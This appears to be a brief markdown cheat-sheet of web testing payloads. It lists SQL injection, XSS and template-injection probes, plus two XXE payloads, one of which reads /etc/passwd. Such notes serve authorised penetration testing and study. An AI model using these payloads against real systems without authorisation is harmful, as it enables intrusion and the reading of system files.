# 3_injection_attacks

## Injection attacks

- Check for SQL injection points using

```
' or 1=1--
```
```
' or 1=1 -- -
```

- Check for XSS (cross site scripting) vulnerabilities using

```
<h1>Hi</h1>
```
```
<script>alert('Hi');</script>
```

- Check for SSTI (server side template injection) using

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

See [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) for more information on server side template injection.

## XXE
Two payloads you can try are listed below.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
